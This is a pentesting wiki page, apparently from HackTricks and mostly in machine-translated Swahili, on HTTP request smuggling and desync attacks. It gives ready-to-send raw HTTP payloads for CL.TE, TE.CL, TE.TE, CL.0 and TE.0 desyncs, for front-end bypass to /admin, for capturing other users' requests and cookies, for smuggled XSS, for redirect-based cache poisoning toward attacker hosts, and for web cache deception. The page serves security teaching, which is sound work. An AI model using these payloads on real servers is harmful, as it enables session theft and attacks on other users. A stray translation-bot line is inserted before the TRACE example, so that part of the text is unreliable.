# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}

## What is

Ushahidi huu hutokea wakati **desyncronization** kati ya **front-end proxies** na **back-end** server inaruhusu **mshambuliaji** **kutuma** HTTP **ombio** ambalo litatafsiriwa kama **ombio moja** na **front-end** proxies (load balance/reverse-proxy) na **kama ombi 2** na **back-end** server.\
Hii inaruhusu mtumiaji **kubadilisha ombi linalofuata linalofika kwa back-end server baada ya lake**.

### Theory

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> Ikiwa ujumbe unapokelewa ukiwa na uwanja wa kichwa cha Transfer-Encoding na uwanja wa kichwa cha Content-Length, wa mwisho LAZIMA upuuziliwe mbali.

**Content-Length**

> Kichwa cha Content-Length kinaonyesha ukubwa wa mwili wa kitu, kwa bytes, kilichotumwa kwa mpokeaji.

**Transfer-Encoding: chunked**

> Kichwa cha Transfer-Encoding kinaelezea aina ya usimbuaji inayotumika kwa usalama kuhamasisha mwili wa payload kwa mtumiaji.\
> Chunked inamaanisha kwamba data kubwa inatumwa katika mfululizo wa vipande.

### Reality

**Front-End** (load-balance / Reverse Proxy) **inasindika** _**content-length**_ au _**transfer-encoding**_ kichwa na **Back-end** server **inasindika** kichwa kingine ikisababisha **desyncronization** kati ya mifumo 2.\
Hii inaweza kuwa hatari sana kwani **mshambuliaji ataweza kutuma ombi moja** kwa reverse proxy ambalo litatafsiriwa na **back-end** server **kama ombi 2 tofauti**. **Hatari** ya mbinu hii inategemea ukweli kwamba **back-end** server **itaelewa** **ombio la 2 lililoingizwa** kana kwamba **lilitoka kwa mteja anayefuata** na **ombio halisi** la mteja huyo litakuwa **sehemu** ya **ombio lililoingizwa**.

### Particularities

Kumbuka kwamba katika HTTP **herufi mpya inaundwa na bytes 2:**

- **Content-Length**: Kichwa hiki kinatumia **nambari ya desimali** kuonyesha **idadi** ya **bytes** za **mwili** wa ombi. Mwili unatarajiwa kumalizika katika herufi ya mwisho, **herufi mpya haitahitajika mwishoni mwa ombi**.
- **Transfer-Encoding:** Kichwa hiki kinatumia katika **mwili** **nambari ya hexadecimal** kuonyesha **idadi** ya **bytes** za **kipande kinachofuata**. **Kipande** lazima **kimalizike** kwa **herufi mpya** lakini herufi hii mpya **haitahesabiwa** na kiashiria cha urefu. Mbinu hii ya usafirishaji lazima ikamilike na **kipande cha ukubwa 0 kinachofuatiwa na herufi 2 mpya**: `0`
- **Connection**: Kulingana na uzoefu wangu, inapendekezwa kutumia **`Connection: keep-alive`** kwenye ombi la kwanza la ombi la Smuggling.

## Basic Examples

> [!TIP]
> Unapojaribu kutumia hii na Burp Suite **zima `Update Content-Length` na `Normalize HTTP/1 line endings`** katika repeater kwa sababu baadhi ya vifaa vinatumia herufi mpya, kurudi kwa gari na maudhui yasiyo sahihi ya urefu.

Mashambulizi ya HTTP request smuggling yanatengenezwa kwa kutuma maombi yasiyo na uwazi ambayo yanatumia tofauti katika jinsi front-end na back-end servers zinavyotafsiri vichwa vya `Content-Length` (CL) na `Transfer-Encoding` (TE). Mashambulizi haya yanaweza kuonekana katika aina tofauti, hasa kama **CL.TE**, **TE.CL**, na **TE.TE**. Kila aina inawakilisha mchanganyiko wa kipekee wa jinsi front-end na back-end servers zinavyopendelea vichwa hivi. Uthibitisho unatokea kutokana na servers kusindika ombi moja kwa njia tofauti, na kusababisha matokeo yasiyotarajiwa na yanaweza kuwa ya uhalifu.

### Basic Examples of Vulnerability Types

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!NOTE]
> Katika jedwali la awali unapaswa kuongeza mbinu ya TE.0, kama mbinu ya CL.0 lakini ukitumia Transfer Encoding.

#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

- **Front-End (CL):** Inasindika ombi kulingana na kichwa cha `Content-Length`.
- **Back-End (TE):** Inasindika ombi kulingana na kichwa cha `Transfer-Encoding`.
- **Kasi ya Shambulio:**

- Mshambuliaji anatumia ombi ambapo thamani ya kichwa cha `Content-Length` haitosheani na urefu halisi wa maudhui.
- Server ya front-end inapeleka ombi lote kwa back-end, kulingana na thamani ya `Content-Length`.
- Server ya back-end inasindika ombi kama kipande kutokana na kichwa cha `Transfer-Encoding: chunked`, ikitafsiri data iliyobaki kama ombi tofauti, linalofuata.
- **Mfano:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

- **Front-End (TE):** Inasindika ombi kulingana na kichwa cha `Transfer-Encoding`.
- **Back-End (CL):** Inasindika ombi kulingana na kichwa cha `Content-Length`.
- **Kasi ya Shambulio:**

- Mshambuliaji anatumia ombi lililosambazwa ambapo ukubwa wa kipande (`7b`) na urefu halisi wa maudhui (`Content-Length: 4`) havikubaliani.
- Server ya front-end, ikiheshimu `Transfer-Encoding`, inapeleka ombi lote kwa back-end.
- Server ya back-end, ikiheshimu `Content-Length`, inasindika tu sehemu ya awali ya ombi (`7b` bytes), ikiacha iliyobaki kama sehemu ya ombi linalofuata lisilotarajiwa.
- **Mfano:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

- **Servers:** Zote zinasaidia `Transfer-Encoding`, lakini moja inaweza kudanganywa kuipuuza kupitia obfuscation.
- **Kasi ya Shambulio:**

- Mshambuliaji anatumia ombi lenye vichwa vya `Transfer-Encoding` vilivyofichwa.
- Kulingana na ni server ipi (front-end au back-end) inashindwa kutambua obfuscation, udhaifu wa CL.TE au TE.CL unaweza kutumika.
- Sehemu isiyosindikwa ya ombi, kama inavyoonekana na moja ya servers, inakuwa sehemu ya ombi linalofuata, ikisababisha smuggling.
- **Mfano:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

- Zote servers zinashughulikia ombi kulingana na kichwa cha `Content-Length`.
- Hali hii kwa kawaida haipelekei smuggling, kwani kuna ulinganifu katika jinsi servers zote zinavyotafsiri urefu wa ombi.
- **Mfano:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- Inahusisha hali ambapo kichwa cha `Content-Length` kinapatikana na kina thamani isiyo sifuri, ikionyesha kwamba mwili wa ombi una maudhui. Back-end inapuuzilia mbali kichwa cha `Content-Length` (ambacho kinachukuliwa kama 0), lakini front-end inakisoma.
- Ni muhimu katika kuelewa na kutengeneza mashambulizi ya smuggling, kwani inaathiri jinsi servers zinavyotambua mwisho wa ombi.
- **Mfano:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- Kama ile ya awali lakini ikitumia TE
- Mbinu [iliyorekodiwa hapa](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Mfano:**
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### Kuvunja seva ya wavuti

Teknolojia hii pia ni muhimu katika hali ambapo inawezekana **kuvunja seva ya wavuti wakati wa kusoma data ya awali ya HTTP** lakini **bila kufunga muunganisho**. Kwa njia hii, **mwili** wa ombi la HTTP utaonekana kama **ombio la HTTP linalofuata**.

Kwa mfano, kama ilivyoelezwa katika [**hiki andiko**](https://mizu.re/post/twisty-python), Katika Werkzeug ilikuwa inawezekana kutuma baadhi ya **Unicode** wahusika na itafanya seva **ivunje**. Hata hivyo, ikiwa muunganisho wa HTTP ulianzishwa na kichwa **`Connection: keep-alive`**, mwili wa ombi hautasomwa na muunganisho utaendelea kuwa wazi, hivyo **mwili** wa ombi utaonekana kama **ombio la HTTP linalofuata**.

#### Kulazimisha kupitia vichwa vya hop-by-hop

Kwa kutumia vichwa vya hop-by-hop unaweza kuonyesha proxy **kufuta kichwa cha Content-Length au Transfer-Encoding ili ombi la HTTP smuggling liweze kutumika vibaya**.
```
Connection: Content-Length
```
Kwa **maelezo zaidi kuhusu vichwa vya hop-by-hop** tembelea:

{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## Kupata HTTP Request Smuggling

Kutambua udhaifu wa HTTP request smuggling mara nyingi kunaweza kufanywa kwa kutumia mbinu za wakati, ambazo zinategemea kuangalia ni muda gani inachukua kwa seva kujibu maombi yaliyobadilishwa. Mbinu hizi ni muhimu sana katika kugundua udhaifu wa CL.TE na TE.CL. Mbali na mbinu hizi, kuna mikakati na zana nyingine ambazo zinaweza kutumika kupata udhaifu kama huo:

### Kupata Udhaifu wa CL.TE kwa Kutumia Mbinu za Wakati

- **Mbinu:**

- Tuma ombi ambalo, ikiwa programu ina udhaifu, litafanya seva ya nyuma kusubiri data zaidi.
- **Mfano:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **Uangalizi:**
- Seva ya mbele inashughulikia ombi kulingana na `Content-Length` na kukata ujumbe mapema.
- Seva ya nyuma, ikitarajia ujumbe wa chunked, inasubiri chunk inayofuata ambayo haitafika, ikisababisha kuchelewesha.

- **Dalili:**
- Timeout au ucheleweshaji mrefu katika majibu.
- Kupokea kosa la 400 Bad Request kutoka kwa seva ya nyuma, wakati mwingine ikiwa na maelezo ya kina ya seva.

### Kupata Udhaifu wa TE.CL kwa Kutumia Mbinu za Wakati

- **Mbinu:**

- Tuma ombi ambalo, ikiwa programu ina udhaifu, litafanya seva ya nyuma kusubiri data zaidi.
- **Mfano:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **Uangalizi:**
- Seva ya mbele inashughulikia ombi kulingana na `Transfer-Encoding` na inapeleka ujumbe mzima.
- Seva ya nyuma, ikitarajia ujumbe kulingana na `Content-Length`, inasubiri data zaidi ambayo haitafika, ikisababisha kuchelewesha.

### Mbinu Nyingine za Kupata Udhaifu

- **Uchambuzi wa Majibu ya Tofauti:**
- Tuma toleo lililobadilishwa kidogo la ombi na uangalie ikiwa majibu ya seva yanatofautiana kwa njia isiyotarajiwa, ikionyesha tofauti ya uchambuzi.
- **Kutumia Zana za Kiotomatiki:**
- Zana kama vile Burp Suite's 'HTTP Request Smuggler' nyongeza zinaweza kujaribu kiotomatiki udhaifu hizi kwa kutuma aina mbalimbali za maombi yasiyo na uwazi na kuchambua majibu.
- **Majaribio ya Tofauti za Content-Length:**
- Tuma maombi yenye thamani tofauti za `Content-Length` ambazo hazilingani na urefu halisi wa maudhui na uangalie jinsi seva inavyoshughulikia tofauti hizo.
- **Majaribio ya Tofauti za Transfer-Encoding:**
- Tuma maombi yenye vichwa vya `Transfer-Encoding` vilivyofichwa au visivyo sahihi na uangalie jinsi seva za mbele na za nyuma zinavyoshughulikia mabadiliko kama hayo.

### Upimaji wa Udhaifu wa HTTP Request Smuggling

Baada ya kuthibitisha ufanisi wa mbinu za wakati, ni muhimu kuthibitisha ikiwa maombi ya mteja yanaweza kubadilishwa. Mbinu rahisi ni kujaribu kuharibu maombi yako, kwa mfano, kufanya ombi kwa `/` kuleta jibu la 404. Mifano ya `CL.TE` na `TE.CL` zilizozungumziwa hapo awali katika [Mifano ya Msingi](#basic-examples) zinaonyesha jinsi ya kuharibu ombi la mteja ili kuleta jibu la 404, licha ya mteja kujaribu kufikia rasilimali tofauti.

**Mambo Muhimu ya Kuangalia**

Wakati wa kupima udhaifu wa request smuggling kwa kuingilia maombi mengine, kumbuka:

- **Mawasiliano Mbalimbali ya Mtandao:** Maombi ya "shambulio" na "ya kawaida" yanapaswa kutumwa kupitia mawasiliano tofauti ya mtandao. Kutumia muunganisho mmoja kwa yote mawili hakuthibitishi uwepo wa udhaifu.
- **URL na Vigezo Vya Kawaida:** Jaribu kutumia URLs na majina ya vigezo sawa kwa maombi yote mawili. Programu za kisasa mara nyingi hupeleka maombi kwa seva maalum za nyuma kulingana na URL na vigezo. Kulinganisha haya kunapanua uwezekano kwamba maombi yote mawili yanashughulikiwa na seva moja, ambayo ni sharti la shambulio lililofanikiwa.
- **Wakati na Masharti ya Mbio:** Ombi la "kawaida", lililokusudiwa kugundua kuingilia kutoka kwa ombi la "shambulio", linashindana na maombi mengine ya programu yanayoendelea. Kwa hivyo, tuma ombi la "kawaida" mara moja baada ya ombi la "shambulio". Programu zenye shughuli nyingi zinaweza kuhitaji majaribio kadhaa kwa uthibitisho wa udhaifu.
- **Changamoto za Usawa wa Mizigo:** Seva za mbele zinazofanya kazi kama wasambazaji wa mizigo zinaweza kugawa maombi kati ya mifumo mbalimbali ya nyuma. Ikiwa maombi ya "shambulio" na "ya kawaida" yanakutana kwenye mifumo tofauti, shambulio halitafanikiwa. Kipengele hiki cha usawa wa mizigo kinaweza kuhitaji majaribio kadhaa kuthibitisha udhaifu.
- **Athari zisizokusudiwa kwa Watumiaji:** Ikiwa shambulio lako kwa bahati mbaya linaathiri ombi la mtumiaji mwingine (sio ombi la "kawaida" ulilotuma kwa ajili ya kugundua), hii inaonyesha kuwa shambulio lako limeathiri mtumiaji mwingine wa programu. Kujaribu mara kwa mara kunaweza kuharibu watumiaji wengine, hivyo inahitajika kuwa na tahadhari.

## Kutumia HTTP Request Smuggling

### Kupita Usalama wa Seva za Mbele kupitia HTTP Request Smuggling

Wakati mwingine, proxies za mbele zinaweka hatua za usalama, zikichunguza maombi yanayoingia. Hata hivyo, hatua hizi zinaweza kupitishwa kwa kutumia HTTP Request Smuggling, kuruhusu ufikiaji usioidhinishwa kwa maeneo yaliyopigwa marufuku. Kwa mfano, kufikia `/admin` kunaweza kuwa marufuku nje, huku proxy ya mbele ikizuia juhudi kama hizo. Hata hivyo, proxy hii inaweza kukosa kukagua maombi yaliyojumuishwa ndani ya ombi la HTTP lililosafirishwa, na kuacha pengo la kupita marufuku hizi.

Fikiria mifano ifuatayo inayoonyesha jinsi HTTP Request Smuggling inaweza kutumika kupita hatua za usalama za mbele, hasa ikilenga njia ya `/admin` ambayo kwa kawaida inalindwa na proxy ya mbele:

**Mfano wa CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Katika shambulio la CL.TE, kichwa cha `Content-Length` kinatumika kwa ombi la awali, wakati ombi lililo ndani linatumia kichwa cha `Transfer-Encoding: chunked`. Proxy ya mbele inashughulikia ombi la awali la `POST` lakini inashindwa kukagua ombi lililo ndani la `GET /admin`, ikiruhusu ufikiaji usioidhinishwa wa njia ya `/admin`.

**TE.CL Mfano**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Kinyume chake, katika shambulio la TE.CL, ombi la awali la `POST` linatumia `Transfer-Encoding: chunked`, na ombi lililoingizwa linasindika kulingana na kichwa cha `Content-Length`. Kama ilivyo katika shambulio la CL.TE, proxy ya mbele inapuuzilia mbali ombi la smuggled `GET /admin`, bila kukusudia ikitoa ufikiaji kwa njia iliyo na vizuizi ya `/admin`.

### Kufichua uandishi wa ombi la mbele <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Programu mara nyingi hutumia **seva ya mbele** kubadilisha maombi yanayoingia kabla ya kuyapeleka kwa seva ya nyuma. Marekebisho ya kawaida yanajumuisha kuongeza vichwa, kama vile `X-Forwarded-For: <IP ya mteja>`, ili kupeleka IP ya mteja kwa seva ya nyuma. Kuelewa marekebisho haya kunaweza kuwa muhimu, kwani kunaweza kufichua njia za **kuepuka ulinzi** au **kufichua taarifa au maeneo yaliyofichwa**.

Ili kuchunguza jinsi proxy inavyobadilisha ombi, pata parameter ya POST ambayo seva ya nyuma inarudisha katika jibu. Kisha, tengeneza ombi, ukitumia parameter hii mwisho, kama ifuatavyo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Katika muundo huu, vipengele vya ombi vinavyofuata vinajumuishwa baada ya `search=`, ambayo ni parameter inayotolewa katika jibu. Hii itafichua vichwa vya ombi vinavyofuata.

Ni muhimu kulinganisha kichwa cha `Content-Length` cha ombi lililo ndani na urefu halisi wa maudhui. Kuanzia na thamani ndogo na kuongeza taratibu inashauriwa, kwani thamani ya chini sana itakata data iliyotolewa, wakati thamani ya juu sana inaweza kusababisha ombi kufeli.

Teknolojia hii pia inatumika katika muktadha wa udhaifu wa TE.CL, lakini ombi linapaswa kumalizika na `search=\r\n0`. Bila kujali wahusika wa newline, thamani zitajumuishwa kwenye parameter ya utafutaji.

Njia hii hasa inatumika kuelewa mabadiliko ya ombi yaliyofanywa na proxy ya mbele, kimsingi ikifanya uchunguzi wa kujiongoza.

### Kukamata maombi ya watumiaji wengine <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Ni rahisi kukamata maombi ya mtumiaji anayefuata kwa kuongeza ombi maalum kama thamani ya parameter wakati wa operesheni ya POST. Hapa kuna jinsi hii inaweza kufanywa:

Kwa kuongeza ombi lifuatalo kama thamani ya parameter, unaweza kuhifadhi ombi la mteja anayefuata:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Katika hali hii, **parameta ya maoni** inakusudia kuhifadhi maudhui ndani ya sehemu ya maoni ya chapisho kwenye ukurasa unaopatikana hadharani. Kwa hivyo, maudhui ya ombi linalofuata yataonekana kama maoni.

Hata hivyo, mbinu hii ina mipaka. Kwa ujumla, inakamata data tu hadi kwenye kipimo cha parameta kilichotumika katika ombi lililosafirishwa. Kwa uwasilishaji wa fomu iliyohifadhiwa kwenye URL, kipimo hiki ni herufi `&`. Hii inamaanisha kuwa maudhui yaliyokamatwa kutoka kwa ombi la mtumiaji waathirika yatakoma kwenye `&` ya kwanza, ambayo inaweza hata kuwa sehemu ya mfuatano wa swali.

Zaidi ya hayo, inafaa kutaja kuwa mbinu hii pia inapatikana na udhaifu wa TE.CL. Katika hali kama hizo, ombi linapaswa kumalizika na `search=\r\n0`. Bila kujali wahusika wa mstari mpya, thamani zitajumuishwa kwenye parameta ya utafutaji.

### Kutumia HTTP request smuggling kutekeleza XSS iliyorejelewa

HTTP Request Smuggling inaweza kutumika kutekeleza kurasa za wavuti zilizo hatarini kwa **Reflected XSS**, ikitoa faida kubwa:

- Maingiliano na watumiaji wa lengo **hayahitajiki**.
- Inaruhusu kutekeleza XSS katika sehemu za ombi ambazo **kwa kawaida hazipatikani**, kama vichwa vya ombi la HTTP.

Katika hali ambapo tovuti inakabiliwa na Reflected XSS kupitia kichwa cha User-Agent, mzigo ufuatao unaonyesha jinsi ya kutumia udhaifu huu:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Hii payload imeundwa ili kutumia udhaifu kwa:

1. Kuanzisha ombi la `POST`, ambalo linaonekana kuwa la kawaida, lenye kichwa cha `Transfer-Encoding: chunked` kuashiria kuanza kwa smuggling.
2. Kufuatia na `0`, ikionyesha mwisho wa ujumbe wa chunked.
3. Kisha, ombi la smuggled `GET` linaanzishwa, ambapo kichwa cha `User-Agent` kinachomekwa na script, `<script>alert(1)</script>`, ikichochea XSS wakati seva inashughulikia ombi hili linalofuata.

Kwa kubadilisha `User-Agent` kupitia smuggling, payload inakwepa vikwazo vya kawaida vya ombi, hivyo kutumia udhaifu wa Reflected XSS kwa njia isiyo ya kawaida lakini yenye ufanisi.

#### HTTP/0.9

> [!CAUTION]
> Ikiwa maudhui ya mtumiaji yanarejelewa katika jibu lenye **`Content-type`** kama **`text/plain`**, kuzuia utekelezaji wa XSS. Ikiwa seva inasaidia **HTTP/0.9 inaweza kuwa inawezekana kupita hii**!

Toleo la HTTP/0.9 lilikuwa kabla ya 1.0 na linatumia tu vitenzi vya **GET** na **halijibu** kwa **headers**, bali tu mwili.

Katika [**hii andiko**](https://mizu.re/post/twisty-python), hii ilitumiwa vibaya na smuggling ya ombi na **nukta ya hatari ambayo itajibu na maudhui ya mtumiaji** ili smuggle ombi na HTTP/0.9. Kigezo ambacho kitarejelewa katika jibu kilikuwa na **jibu la uwongo la HTTP/1.1 (pamoja na headers na mwili)** hivyo jibu litakuwa na msimbo halali wa JS unaoweza kutekelezwa wenye `Content-Type` wa `text/html`.

### Kutumia Mwelekeo wa Kwenye Tovuti kwa HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Programu mara nyingi hupeleka kutoka URL moja hadi nyingine kwa kutumia jina la mwenyeji kutoka kichwa cha `Host` katika URL ya mwelekeo. Hii ni ya kawaida na seva za wavuti kama Apache na IIS. Kwa mfano, kuomba folda bila slash ya mwisho kunasababisha mwelekeo kuingiza slash:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Matokeo katika:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Ingawa inaonekana haina madhara, tabia hii inaweza kudhibitiwa kwa kutumia HTTP request smuggling ili kuwahamisha watumiaji kwenye tovuti ya nje. Kwa mfano:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Ombi hili lililofichwa linaweza kusababisha ombi la mtumiaji linalofuatia kushindwa kuelekezwa kwenye tovuti inayodhibitiwa na mshambuliaji:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Matokeo katika:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
Katika hali hii, ombi la mtumiaji la faili la JavaScript linachukuliwa. Mshambuliaji anaweza kuathiri mtumiaji kwa kutoa JavaScript mbaya kama jibu.

### Kutumia Upoisonaji wa Kivinjari cha Mtandao kupitia HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Upoisonaji wa kivinjari cha mtandao unaweza kutekelezwa ikiwa sehemu yoyote ya **miundombinu ya mbele inahifadhi maudhui**, kawaida ili kuboresha utendaji. Kwa kubadilisha jibu la seva, inawezekana **kuponya kivinjari**.

Awali, tuliona jinsi majibu ya seva yanaweza kubadilishwa ili kurudisha kosa la 404 (rejelea [Mifano ya Msingi](#basic-examples)). Vivyo hivyo, inawezekana kumdanganya seva kutoa maudhui ya `/index.html` kama jibu la ombi la `/static/include.js`. Kwa hivyo, maudhui ya `/static/include.js` yanabadilishwa katika kivinjari na yale ya `/index.html`, na kufanya `/static/include.js` kuwa haipatikani kwa watumiaji, ambayo inaweza kusababisha Kukatizwa kwa Huduma (DoS).

Tekniki hii inakuwa na nguvu hasa ikiwa **udhaifu wa Open Redirect** unapatikana au ikiwa kuna **kuhamasisha kwenye tovuti kwa redirect wazi**. Udhaifu kama huu unaweza kutumika kubadilisha maudhui yaliyohifadhiwa ya `/static/include.js` na skripti chini ya udhibiti wa mshambuliaji, kwa msingi inaruhusu shambulio la Cross-Site Scripting (XSS) dhidi ya wateja wote wanaoomba `/static/include.js` iliyosasishwa.

Hapa kuna mfano wa kutumia **upoisonaji wa kivinjari pamoja na kuhamasisha kwenye tovuti kwa redirect wazi**. Lengo ni kubadilisha maudhui ya kivinjari ya `/static/include.js` ili kutoa msimbo wa JavaScript unaodhibitiwa na mshambuliaji:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Note ombi lililojumuishwa linalolenga `/post/next?postId=3`. Ombi hili litarejelewa kwa `/post?postId=4`, likitumia **thamani ya kichwa cha Host** kubaini kikoa. Kwa kubadilisha **kichwa cha Host**, mshambuliaji anaweza kurejelea ombi hilo kwa kikoa chao (**kuhamasisha kwenye tovuti ili kufungua kuhamasisha**).

Baada ya **kuambukizwa kwa socket** kufanikiwa, **ombile la GET** kwa `/static/include.js` linapaswa kuanzishwa. Ombi hili litakuwa na maambukizi kutoka kwa ombi la awali la **kuhamasisha kwenye tovuti ili kufungua kuhamasisha** na kuchukua maudhui ya skripti inayodhibitiwa na mshambuliaji.

Baadaye, ombi lolote kwa `/static/include.js` litatoa maudhui yaliyohifadhiwa ya skripti ya mshambuliaji, kwa ufanisi kuanzisha shambulio kubwa la XSS.

### Kutumia HTTP request smuggling kufanya udanganyifu wa cache ya wavuti <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Ni tofauti gani kati ya kuambukizwa kwa cache ya wavuti na udanganyifu wa cache ya wavuti?**
>
> - Katika **kuambukizwa kwa cache ya wavuti**, mshambuliaji anasababisha programu kuhifadhi maudhui fulani ya uharibifu katika cache, na maudhui haya yanatolewa kutoka kwenye cache kwa watumiaji wengine wa programu.
> - Katika **udanganyifu wa cache ya wavuti**, mshambuliaji anasababisha programu kuhifadhi maudhui fulani nyeti yanayomilikiwa na mtumiaji mwingine katika cache, na mshambuliaji kisha anachukua maudhui haya kutoka kwenye cache.

Mshambuliaji anaunda ombi lililofichwa linalochukua maudhui nyeti ya mtumiaji maalum. Fikiria mfano ufuatao:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Ikiwa ombi hili lililofichwa linachafua kipengee cha cache kilichokusudiwa kwa maudhui ya statiki (kwa mfano, `/someimage.png`), data nyeti za mwathirika kutoka `/private/messages` zinaweza kuhifadhiwa chini ya kipengee cha cache cha maudhui ya statiki. Kwa hivyo, mshambuliaji anaweza kupata data hizi nyeti zilizohifadhiwa.

### Kutumia TRACE kupitia HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**Katika chapisho hili**](https://portswigger.net/research/trace-desync-attack) inapendekezwa kwamba ikiwa seva ina njia ya TRACE iliyoanzishwa inaweza kuwa inawezekana kuitumia vibaya na HTTP Request Smuggling. Hii ni kwa sababu njia hii itarejesha kichwa chochote kilichotumwa kwa seva kama sehemu ya mwili wa jibu. Kwa mfano:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
I'm ready to assist you with the translation. Please provide the text you would like me to translate to Swahili.
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
